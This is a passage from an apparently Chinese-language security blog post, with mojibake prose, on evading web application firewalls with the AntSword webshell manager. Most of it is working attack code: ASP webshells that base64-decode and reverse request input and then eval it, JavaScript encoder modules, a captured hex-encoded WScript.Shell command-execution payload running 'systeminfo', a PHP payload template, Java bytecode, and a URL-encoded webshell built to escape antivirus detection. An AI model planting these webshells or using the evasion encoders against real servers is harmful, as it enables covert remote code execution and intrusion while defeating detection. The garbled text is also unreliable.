ndx = ndx + 4</span><br><span class="line">    loop</span><br><span class="line">    if ndx &lt; realLen then</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        if realLen MOD 4 = 3 then</span><br><span class="line">            third = Base64DecMap(asc(mid(scrambled,ndx+2,1)))</span><br><span class="line">            ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line">    base64Decode = ret</span><br><span class="line">END FUNCTION</span><br><span class="line">&#x27; åˆå§‹åŒ–</span><br><span class="line">call initCodecs</span><br><span class="line">Dim expression</span><br><span class="line">expression = Request(&quot;a&quot;)</span><br><span class="line">&#x27; Response.Write expression</span><br><span class="line">Dim result</span><br><span class="line">result = eval(base64Decode(expression))</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢å¾ˆç®€å•ï¼Œå°±æ˜¯å®šä¹‰äº†ä¸€ä¸ªbase64è§£ç å‡½æ•°ï¼Œç„¶åä¼ é€’äº†aå‚æ•°ï¼Œç„¶åè¿›è¡Œbase64è§£ç ï¼Œç„¶åè¿›è¡Œevalå°±å¯ä»¥äº†ã€‚<br><img src="/images/antsword-bypasswaf/image-20240402144243216.png" alt="image-20240402144243216"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»å°†payloadbase64äº†ã€‚</p><p><img src="/images/antsword-bypasswaf/image-20240402144314008.png" alt="image-20240402144314008"></p><p>ä¸‹é¢çš„åŠŸèƒ½ç‚¹è¿˜æ²¡æœ‰æ“ä½œï¼Œåé¢ä¸€èµ·æ“ä½œã€‚</p><p>è¿™é‡Œ</p><p><code>Dim expression expression = Request(&quot;a&quot;) &#39; Response.Write expression Dim result result = eval(base64Decode(expression))</code></p><p>è¿™ç§å†™æ³•å¯èƒ½ä¼šæŠ¥500é”™è¯¯ï¼Œå¥½åƒaspä¸æ”¯æŒè¿™ç§å‡½æ•°å¥—å‡½æ•°<br><code>Dim expression expression = Request(&quot;a&quot;) &#39; Response.Write expression Dim result result = base64Decode(expression) Dim resulta resulta = eval(resulta)</code></p><p>è¿™æ ·å†™å°±ä¸ä¼šæŠ¥500é”™è¯¯ã€‚ä½†æ˜¯æŠ¥500é”™è¯¯ä¸å½±å“ä½¿ç”¨ï¼Œç›´æ¥èšå‰‘è¿å°±è¡Œ</p><p><img src="/images/antsword-bypasswaf/image-20240402145953759.png" alt="image-20240402145953759"></p><p>è¿˜æ˜¯é‚£æ ·ï¼Œå¦‚æœwafèƒ½è§£å¯†base64æ€ä¹ˆåŠï¼Œæˆ‘ä»¬è¿˜æ˜¯å°†payloadé€†åºã€‚<br>å…¶å®å¾ˆç®€å•</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * asp::base64,reç¼–ç å™¨</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/04 21:37:02</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   è¿æ¥å¯†ç </span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†å‰çš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>).split(<span class="string">&#x27;&#x27;</span>).reverse().join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="comment">// shell åœ¨æ¥æ”¶åˆ° payload åï¼Œbase64,ç„¶åé€†åºã€‚</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    è¯·åœ¨ä¸Šæ–¹ç¼–å†™ä½ è‡ªå·±çš„ä»£ç    ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ é™¤ _ åŸæœ‰çš„payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// è¿”å›ç¼–ç å™¨å¤„ç†åçš„ payload æ•°ç»„</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">OPTION EXPLICIT</span><br><span class="line">const BASE_64_MAP_INIT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line">dim newline</span><br><span class="line">dim Base64EncMap(63)</span><br><span class="line">dim Base64DecMap(127)</span><br><span class="line">&#x27;åˆå§‹åŒ–å‡½æ•°</span><br><span class="line">PUBLIC SUB initCodecs()</span><br><span class="line">    &#x27; åˆå§‹åŒ–å˜é‡</span><br><span class="line">    newline = &quot;&lt;P&gt;&quot; &amp; chr(13) &amp; chr(10)</span><br><span class="line">    dim max, idx</span><br><span class="line">    max = len(BASE_64_MAP_INIT)</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64EncMap(idx) = mid(BASE_64_MAP_INIT, idx + 1, 1)</span><br><span class="line">    next</span><br><span class="line">    for idx = 0 to max - 1</span><br><span class="line">        Base64DecMap(ASC(Base64EncMap(idx))) = idx</span><br><span class="line">    next</span><br><span class="line">END SUB</span><br><span class="line">&#x27;Base64è§£å¯†å‡½æ•°</span><br><span class="line">PUBLIC FUNCTION base64Decode(scrambled)</span><br><span class="line">    if len(scrambled) = 0 then</span><br><span class="line">        base64Decode = &quot;&quot;</span><br><span class="line">        exit function</span><br><span class="line">    end if</span><br><span class="line">    dim realLen</span><br><span class="line">    realLen = len(scrambled)</span><br><span class="line">    do while mid(scrambled, realLen, 1) = &quot;=&quot;</span><br><span class="line">        realLen = realLen - 1</span><br><span class="line">    loop</span><br><span class="line">    dim ret, ndx, by4, first, second, third, fourth</span><br><span class="line">    ret = &quot;&quot;</span><br><span class="line">    by4 = (realLen \ 4) * 4</span><br><span class="line">    ndx = 1</span><br><span class="line">    do while ndx &lt;= by4</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        third = Base64DecMap(asc(mid(scrambled, ndx+2, 1)))</span><br><span class="line">        fourth = Base64DecMap(asc(mid(scrambled, ndx+3, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        ret = ret &amp; chr( ((third * 64) AND 255) + (fourth AND 63))</span><br><span class="line">        ndx = ndx + 4</span><br><span class="line">    loop</span><br><span class="line">    if ndx &lt; realLen then</span><br><span class="line">        first = Base64DecMap(asc(mid(scrambled, ndx+0, 1)))</span><br><span class="line">        second = Base64DecMap(asc(mid(scrambled, ndx+1, 1)))</span><br><span class="line">        ret = ret &amp; chr( ((first * 4) AND 255) + ((second \ 16) AND 3))</span><br><span class="line">        if realLen MOD 4 = 3 then</span><br><span class="line">            third = Base64DecMap(asc(mid(scrambled,ndx+2,1)))</span><br><span class="line">            ret = ret &amp; chr( ((second * 16) AND 255) + ((third \ 4) AND 15))</span><br><span class="line">        end if</span><br><span class="line">    end if</span><br><span class="line">    base64Decode = ret</span><br><span class="line">END FUNCTION</span><br><span class="line">&#x27; åˆå§‹åŒ–</span><br><span class="line">call initCodecs</span><br><span class="line">Dim expression</span><br><span class="line">expression = Request(&quot;a&quot;)</span><br><span class="line">&#x27; Response.Write expression</span><br><span class="line">Dim result</span><br><span class="line">result = eval(base64Decode(StrReverse(expression)))</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/antsword-bypasswaf/image-20240402145431019.png" alt="image-20240402145431019"></p><p><img src="/images/antsword-bypasswaf/image-20240402145440952.png" alt="image-20240402145440952"></p><p>æ–¹æ³•ä¸å”¯ä¸€ï¼Œä½ å†å¥—ä¸€å±‚base64ä¹Ÿå¯ä»¥ï¼Œæˆ–è€…å…¶ä»–çš„éƒ½è¡Œ</p><h5 id="aspè§£ç å™¨"><a href="#aspè§£ç å™¨" class="headerlink" title="aspè§£ç å™¨"></a>aspè§£ç å™¨</h5><p>å…ˆæ”¾ç€ï¼Œæœªè§£å†³</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">eval(&quot;Ex&quot;&amp;cHr(101)&amp;&quot;cute(&quot;&quot;Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(&quot;&quot;&quot;&quot;bd=bd&amp;chr(&amp;H&quot;&quot;&quot;&quot;&amp;c&amp;&quot;&quot;&quot;&quot;)&quot;&quot;&quot;&quot;):Else:Execute(&quot;&quot;&quot;&quot;bd=bd&amp;chr(&amp;H&quot;&quot;&quot;&quot;&amp;c&amp;Mid(s,i+2,2)&amp;&quot;&quot;&quot;&quot;)&quot;&quot;&quot;&quot;):i=i+2:End If&quot;&quot;&amp;chr(10)&amp;&quot;&quot;Next:End Function:Response.Write(&quot;&quot;&quot;&quot;fa68f&quot;&quot;&quot;&quot;&amp;&quot;&quot;&quot;&quot;8ae679&quot;&quot;&quot;&quot;):Ex&quot;&amp;cHr(101)&amp;&quot;cute(&quot;&quot;&quot;&quot;On Error Resume Next:&quot;&quot;&quot;&quot;&amp;bd(&quot;&quot;&quot;&quot;53657420507574456E763D4372656174654F626A6563742822575363726970742E5368656C6C22292E456E7669726F6E6D656E74282250726F6365737322293A656E767374723D53706C69742822222662642852657175657374282273393564663431313539353839662229292622222C20227C7C7C61736C696E657C7C7C22293A466F72204561636820656E766C696E6520696E20656E767374723A4966204C656E28656E766C696E65293E30205468656E3A73733D53706C697428656E766C696E652C20227C7C7C61736B65797C7C7C22293A507574456E76287373283029293D73732831293A456E642049663A4E6578743A53657420583D4372656174654F626A6563742822777363726970742E7368656C6C22292E65786563282222222226626428526571756573742822786462656436376438316664306322292926222222202F63202222222662642852657175657374282278326335613238636464366561382229292622222222293A496620457272205468656E3A533D225B4572725D2022264572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A4F3D582E5374644F75742E52656164416C6C28293A453D582E5374644572722E52656164416C6C28293A533D4F26453A456E642049663A526573706F6E73652E7772697465285329&quot;&quot;&quot;&quot;)):Response.Write(&quot;&quot;&quot;&quot;c9dd&quot;&quot;&quot;&quot;&amp;&quot;&quot;&quot;&quot;b1fc&quot;&quot;&quot;&quot;):Response.End&quot;&quot;)&quot;)</span><br><span class="line"></span><br><span class="line">Set PutEnv=CreateObject(&quot;WScript.Shell&quot;).Environment(&quot;Process&quot;):envstr=Split(&quot;&quot;&amp;bd(Request(&quot;s95df41159589f&quot;))&amp;&quot;&quot;, &quot;|||asline|||&quot;):For Each envline in envstr:If Len(envline)&gt;0 Then:ss=Split(envline, &quot;|||askey|||&quot;):PutEnv(ss(0))=ss(1):End If:Next:Set X=CreateObject(&quot;wscript.shell&quot;).exec(&quot;&quot;&quot;&quot;&amp;bd(Request(&quot;xdbed67d81fd0c&quot;))&amp;&quot;&quot;&quot; /c &quot;&quot;&quot;&amp;bd(Request(&quot;x2c5a28cdd6ea8&quot;))&amp;&quot;&quot;&quot;&quot;):If Err Then:S=&quot;[Err] &quot;&amp;Err.Description:Err.Clear:Else:O=X.StdOut.ReadAll():E=X.StdErr.ReadAll():S=O&amp;E:End If:Response.write(S)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd /d &quot;&quot;&amp;systeminfo&amp;echo e504dc95&amp;cd&amp;echo dc8d8a</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package src;</span><br><span class="line"></span><br><span class="line">public class AsoutputReverse &#123;</span><br><span class="line">    String res;</span><br><span class="line"></span><br><span class="line">    public AsoutputReverse(String var1) &#123;</span><br><span class="line">        this.res = (new StringBuffer(var1)).reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;&#123;\&quot;message\&quot;:\&quot;&quot; + this.res + &quot;\&quot;&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">yv66vgAAADEAHgoACAATBwAUCgACABUKAAIAFgoAAgAXCQAHABgHABkHABoBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQwACwAbAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwACwAMDAAcAB0MAA8AEAwACQAKAQATc3JjL0Fzb3V0cHV0UmV2ZXJzZQEAEGphdmEvbGFuZy9PYmplY3QBAAMoKVYBAAdyZXZlcnNlAQAaKClMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsAIQAHAAgAAAABAAAACQAKAAAAAgABAAsADAABAA0AAAA3AAQAAgAAABcqtwABKrsAAlkrtwADtgAEtgAFtQAGsQAAAAEADgAAAA4AAwAAAAQABAAFABYABgABAA8AEAABAA0AAAAdAAEAAQAAAAUqtAAGsAAAAAEADgAAAAYAAQAAAAkAAQARAAAAAgAS</span><br><span class="line"></span><br><span class="line">yv66vgAAADEAHgoACAATBwAUCgACABUKAAIAFgoAAgAXCQAHABgHABkHABoBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQwACwAbAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwACwAMDAAcAB0MAA8AEAwACQAKAQATc3JjL0Fzb3V0cHV0UmV2ZXJzZQEAEGphdmEvbGFuZy9PYmplY3QBAAMoKVYBAAdyZXZlcnNlAQAaKClMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsAIQAHAAgAAAABAAAACQAKAAAAAgABAAsADAABAA0AAAA3AAQAAgAAABcqtwABKrsAAlkrtwADtgAEtgAFtQAGsQAAAAEADgAAAA4AAwAAAAQABAAFABYABgABAA8AEAABAA0AAAAdAAEAAQAAAAUqtAAGsAAAAAEADgAAAAYAAQAAAAkAAQARAAAAAgAS</span><br><span class="line"></span><br><span class="line">yv66vgAAADsAHgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWBwAIAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgoABwAKDAAFAAsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYKAAcADQwADgAPAQAHcmV2ZXJzZQEAGigpTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7CgAHABEMABIAEwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsJABUAFgcAFwwAGAAZAQATc3JjL0Fzb3V0cHV0UmV2ZXJzZQEAA3JlcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAUQXNvdXRwdXRSZXZlcnNlLmphdmEAIQAVAAIAAAABAAAAGAAZAAAAAgABAAUACwABABoAAAA3AAQAAgAAABcqtwABKrsAB1krtwAJtgAMtgAQtQAUsQAAAAEAGwAAAA4AAwAAAAUABAAGABYABwABABIAEwABABoAAAAdAAEAAQAAAAUqtAAUsAAAAAEAGwAAAAYAAQAAAAoAAQAcAAAAAgAd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data[&#x27;_&#x27;] = `@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$&#123;bypassOpenBaseDirCode&#125;;function asenc($out)&#123;</span><br><span class="line">  return @base64_encode($out);;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;&quot;.&quot;&quot;;echo @asenc($output);echo &quot;&quot;.&quot;&quot;;&#125;ob_start();try&#123;$&#123;tmpCode&#125;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();`;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è®°å½•ä¸€ä¸‹aspçš„å…æ€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">execute(unescape(&quot;%4f%50%54%49%4f%4e%20%45%58%50%4c%49%43%49%54%0a%63%6f%6e%73%74%20%42%41%53%45%5f%36%34%5f%4d%41%50%5f%49%4e%49%54%20%3d%20%22%41%42%43%44%45%46%47%48%49%4a%4b%4c%4d%4e%4f%50%51%52%53%54%55%56%57%58%59%5a%61%62%63%64%65%66%67%68%69%6a%6b%6c%6d%6e%6f%70%71%72%73%74%75%76%77%78%79%7a%30%31%32%33%34%35%36%37%38%39%2b%2f%22%0a%64%69%6d%20%6e%65%77%6c%69%6e%65%0a%64%69%6d%20%42%61%73%65%36%34%45%6e%63%4d%61%70%28%36%33%29%0a%64%69%6d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%31%32%37%29%0a%27%1d%cb%16%fd%70%0a%50%55%42%4c%49%43%20%53%55%42%20%69%6e%69%74%43%6f%64%65%63%73%28%29%0a%20%20%20%20%27%20%1d%cb%16%d8%cf%0a%20%20%20%20%6e%65%77%6c%69%6e%65%20%3d%20%22%3c%50%3e%22%20%26%20%63%68%72%28%31%33%29%20%26%20%63%68%72%28%31%30%29%0a%20%20%20%20%64%69%6d%20%6d%61%78%2c%20%69%64%78%0a%20%20%20%20%6d%61%78%20%3d%20%6c%65%6e%28%42%41%53%45%5f%36%34%5f%4d%41%50%5f%49%4e%49%54%29%0a%20%20%20%20%66%6f%72%20%69%64%78%20%3d%20%30%20%74%6f%20%6d%61%78%20%2d%20%31%0a%20%20%20%20%20%20%20%20%42%61%73%65%36%34%45%6e%63%4d%61%70%28%69%64%78%29%20%3d%20%6d%69%64%28%42%41%53%45%5f%36%34%5f%4d%41%50%5f%49%4e%49%54%2c%20%69%64%78%20%2b%20%31%2c%20%31%29%0a%20%20%20%20%6e%65%78%74%0a%20%20%20%20%66%6f%72%20%69%64%78%20%3d%20%30%20%74%6f%20%6d%61%78%20%2d%20%31%0a%20%20%20%20%20%20%20%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%41%53%43%28%42%61%73%65%36%34%45%6e%63%4d%61%70%28%69%64%78%29%29%29%20%3d%20%69%64%78%0a%20%20%20%20%6e%65%78%74%0a%45%4e%44%20%53%55%42%0a%27%42%61%73%65%36%34%e3%c6%fd%70%0a%50%55%42%4c%49%43%20%46%55%4e%43%54%49%4f%4e%20%62%61%73%65%36%34%44%65%63%6f%64%65%28%73%63%72%61%6d%62%6c%65%64%29%0a%20%20%20%20%69%66%20%6c%65%6e%28%73%63%72%61%6d%62%6c%65%64%29%20%3d%20%30%20%74%68%65%6e%0a%20%20%20%20%20%20%20%20%62%61%73%65%36%34%44%65%63%6f%64%65%20%3d%20%22%22%0a%20%20%20%20%20%20%20%20%65%78%69%74%20%66%75%6e%63%74%69%6f%6e%0a%20%20%20%20%65%6e%64%20%69%66%0a%20%20%20%20%64%69%6d%20%72%65%61%6c%4c%65%6e%0a%20%20%20%20%72%65%61%6c%4c%65%6e%20%3d%20%6c%65%6e%28%73%63%72%61%6d%62%6c%65%64%29%0a%20%20%20%20%64%6f%20%77%68%69%6c%65%20%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%72%65%61%6c%4c%65%6e%2c%20%31%29%20%3d%20%22%3d%22%0a%20%20%20%20%20%20%20%20%72%65%61%6c%4c%65%6e%20%3d%20%72%65%61%6c%4c%65%6e%20%2d%20%31%0a%20%20%20%20%6c%6f%6f%70%0a%20%20%20%20%64%69%6d%20%72%65%74%2c%20%6e%64%78%2c%20%62%79%34%2c%20%66%69%72%73%74%2c%20%73%65%63%6f%6e%64%2c%20%74%68%69%72%64%2c%20%66%6f%75%72%74%68%0a%20%20%20%20%72%65%74%20%3d%20%22%22%0a%20%20%20%20%62%79%34%20%3d%20%28%72%65%61%6c%4c%65%6e%20%5c%20%34%29%20%2a%20%34%0a%20%20%20%20%6e%64%78%20%3d%20%31%0a%20%20%20%20%64%6f%20%77%68%69%6c%65%20%6e%64%78%20%3c%3d%20%62%79%34%0a%20%20%20%20%20%20%20%20%66%69%72%73%74%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%6e%64%78%2b%30%2c%20%31%29%29%29%0a%20%20%20%20%20%20%20%20%73%65%63%6f%6e%64%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%6e%64%78%2b%31%2c%20%31%29%29%29%0a%20%20%20%20%20%20%20%20%74%68%69%72%64%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%6e%64%78%2b%32%2c%20%31%29%29%29%0a%20%20%20%20%20%20%20%20%66%6f%75%72%74%68%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%6e%64%78%2b%33%2c%20%31%29%29%29%0a%20%20%20%20%20%20%20%20%72%65%74%20%3d%20%72%65%74%20%26%20%63%68%72%28%20%28%28%66%69%72%73%74%20%2a%20%34%29%20%41%4e%44%20%32%35%35%29%20%2b%20%28%28%73%65%63%6f%6e%64%20%5c%20%31%36%29%20%41%4e%44%20%33%29%29%0a%20%20%20%20%20%20%20%20%72%65%74%20%3d%20%72%65%74%20%26%20%63%68%72%28%20%28%28%73%65%63%6f%6e%64%20%2a%20%31%36%29%20%41%4e%44%20%32%35%35%29%20%2b%20%28%28%74%68%69%72%64%20%5c%20%34%29%20%41%4e%44%20%31%35%29%29%0a%20%20%20%20%20%20%20%20%72%65%74%20%3d%20%72%65%74%20%26%20%63%68%72%28%20%28%28%74%68%69%72%64%20%2a%20%36%34%29%20%41%4e%44%20%32%35%35%29%20%2b%20%28%66%6f%75%72%74%68%20%41%4e%44%20%36%33%29%29%0a%20%20%20%20%20%20%20%20%6e%64%78%20%3d%20%6e%64%78%20%2b%20%34%0a%20%20%20%20%6c%6f%6f%70%0a%20%20%20%20%69%66%20%6e%64%78%20%3c%20%72%65%61%6c%4c%65%6e%20%74%68%65%6e%0a%20%20%20%20%20%20%20%20%66%69%72%73%74%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%6e%64%78%2b%30%2c%20%31%29%29%29%0a%20%20%20%20%20%20%20%20%73%65%63%6f%6e%64%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%20%6e%64%78%2b%31%2c%20%31%29%29%29%0a%20%20%20%20%20%20%20%20%72%65%74%20%3d%20%72%65%74%20%26%20%63%68%72%28%20%28%28%66%69%72%73%74%20%2a%20%34%29%20%41%4e%44%20%32%35%35%29%20%2b%20%28%28%73%65%63%6f%6e%64%20%5c%20%31%36%29%20%41%4e%44%20%33%29%29%0a%20%20%20%20%20%20%20%20%69%66%20%72%65%61%6c%4c%65%6e%20%4d%4f%44%20%34%20%3d%20%33%20%74%68%65%6e%0a%20%20%20%20%20%20%20%20%20%20%20%20%74%68%69%72%64%20%3d%20%42%61%73%65%36%34%44%65%63%4d%61%70%28%61%73%63%28%6d%69%64%28%73%63%72%61%6d%62%6c%65%64%2c%6e%64%78%2b%32%2c%31%29%29%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%20%3d%20%72%65%74%20%26%20%63%68%72%28%20%28%28%73%65%63%6f%6e%64%20%2a%20%31%36%29%20%41%4e%44%20%32%35%35%29%20%2b%20%28%28%74%68%69%72%64%20%5c%20%34%29%20%41%4e%44%20%31%35%29%29%0a%20%20%20%20%20%20%20%20%65%6e%64%20%69%66%0a%20%20%20%20%65%6e%64%20%69%66%0a%20%20%20%20%62%61%73%65%36%34%44%65%63%6f%64%65%20%3d%20%72%65%74%0a%45%4e%44%20%46%55%4e